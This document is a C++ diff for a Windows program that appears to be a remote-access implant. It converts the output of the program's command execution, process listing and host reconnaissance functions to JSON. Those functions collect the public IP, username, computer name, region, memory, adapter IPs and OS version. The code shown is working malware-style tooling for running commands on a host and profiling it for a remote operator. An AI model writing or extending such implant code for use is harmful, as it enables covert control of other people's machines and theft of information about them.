@@ -108,6 +108,8 @@ BOOL doFileDownload(std::string url, std::string filepath) {
 //Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
 //Returns string buffer containing command output 
 std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
+	nlohmann::json jsonInfo;
+	jsonInfo["command"] = cmd;
 	std::string output;
 	cmd = strings->cmd + cmd;
 	HANDLE hPipeRead;
@@ -118,7 +120,7 @@ std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	saAttr.lpSecurityDescriptor = NULL;
 
 	if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
-		return output;
+		return jsonInfo.dump();
 
 	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
@@ -132,7 +134,7 @@ std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	{
 		CloseHandle(hPipeWrite);
 		CloseHandle(hPipeRead);
-		return output;
+		return jsonInfo.dump();
 	}
 
 	SYSTEMTIME startTime, currentTime;
@@ -171,7 +173,8 @@ std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	CloseHandle(hPipeRead);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
-	return output;
+	jsonInfo["output"] = output;
+	return jsonInfo.dump();
 }
 
 
@@ -196,16 +199,15 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 
 //Gathers OS information via ProductName and DisplayVersion registry keys, returns string
 std::string getOSInfo(struct Strings* strings) {
-	std::string str_data;
+	nlohmann::json jsonInfo;
 	char value[256];
 	DWORD BufferSize = 255;
 	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->productname.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 	value[BufferSize] = 0;
-	str_data += value;
-	str_data += " ";
-	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->productname.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
-	str_data += value;
-	return str_data;
+	jsonInfo["ProductName"] = value;
+	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->displayversion.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	jsonInfo["DisplayVersion"] = value;
+	return jsonInfo.dump();
 }
 
 
@@ -224,7 +226,7 @@ std::string getPublicIP(HANDLE hInternet) {
 
 //Gets list of current running processes and converts to string
 std::string getProcToStr() {
-	std::string proclst;
+	nlohmann::json jsonInfo;
 	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 procEntry;
 	procEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -233,16 +235,13 @@ std::string getProcToStr() {
 	{
 		std::wstring ws(procEntry.szExeFile);
 		std::string str(ws.begin(), ws.end());
-		proclst += str;
-		proclst += ":";
 		char buf[UNLEN + 1];
 		DWORD len = UNLEN + 1;
 		_itoa_s(procEntry.th32ProcessID, buf, 10);
 		buf[UNLEN] = 0;
-		proclst += buf;
-		proclst += "&";
+		jsonInfo[buf] = str;
 	} while (Process32Next(hTH32, &procEntry));
-	return proclst;
+	return jsonInfo.dump();
 }
 
 
@@ -267,7 +266,8 @@ BOOLEAN killProcess(DWORD pid) {
 
 //Gets list of network interfaces and converts MAC/IP addresses to comma-separated string
 std::string getNetworkInfo() {
-	std::string nwInfo;
+	nlohmann::json jsonInfo;
+
 	PIP_ADAPTER_INFO pAdapterInfo;
 	PIP_ADAPTER_INFO pAdapter = NULL;
 	DWORD dwRetVal = 0;
@@ -288,15 +288,16 @@ std::string getNetworkInfo() {
 
 	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
 		pAdapter = pAdapterInfo;
+		int i = 0;
 		while (pAdapter) {
-			nwInfo += pAdapter->IpAddressList.IpAddress.String;
-			nwInfo += ",";
+			jsonInfo[i] = pAdapter->IpAddressList.IpAddress.String;
 			pAdapter = pAdapter->Next;
+			i++;
 		}
 	}
 	if (pAdapterInfo)
 		FREE(pAdapterInfo);
-	return nwInfo;
+	return jsonInfo.dump();
 }
 
 
@@ -306,17 +307,19 @@ Currently includes: public IP, username, computer name, geolocation, memory amou
 Output Format: publicIP&username&computername&iso2&memory&ip1,ip2,ip3...&osInfo
 */
 std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
-	std::string allInfo;
-	allInfo += getPublicIP(hInternet);
-	allInfo += "&";
+	nlohmann::json jsonInfo;
+	
+	jsonInfo["publicip"] = getPublicIP(hInternet);
 
 	char username[UNLEN + 1];
 	DWORD len = UNLEN + 1;
 
 	BOOL getUserSuccess = GetUserNameA(username, &len);
 	if (getUserSuccess) {
-		allInfo += username;
-		allInfo += "&";
+		jsonInfo["username"] = username;
+	}
+	else {
+		jsonInfo["username"] = "N/A";
 	}
 
 	char computername[UNLEN + 1];
@@ -324,24 +327,24 @@ std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
 
 	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
 	if (getComputerNameSuccess) {
-		allInfo += computername;
-		allInfo += "&";
+		jsonInfo["computername"] = computername;
+	}
+	else {
+		jsonInfo["computername"] = "N/A";
 	}
 
 	GEOID g = GetUserGeoID(GEOCLASS_NATION);
 	char iso2[UNLEN + 1];
 	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
-	allInfo += iso2;
-	allInfo += "&";
+	jsonInfo["region"] = iso2;
 
 	ULONGLONG memqty = 0;
 	GetPhysicallyInstalledSystemMemory(&memqty);
 	char memqtystr[UNLEN + 1];
 	_ui64toa_s(memqty, memqtystr, UNLEN, 10);
-	allInfo += memqtystr;
-	allInfo += "&";
-	allInfo += getNetworkInfo();
-	allInfo += "&";
-	allInfo += getOSInfo(strings);
-	return allInfo;
+
+	jsonInfo["memory"] = memqtystr;
+	jsonInfo["netinfo"] = getNetworkInfo();
+	jsonInfo["osinfo"] = getOSInfo(strings);
+	return jsonInfo.dump();
 }
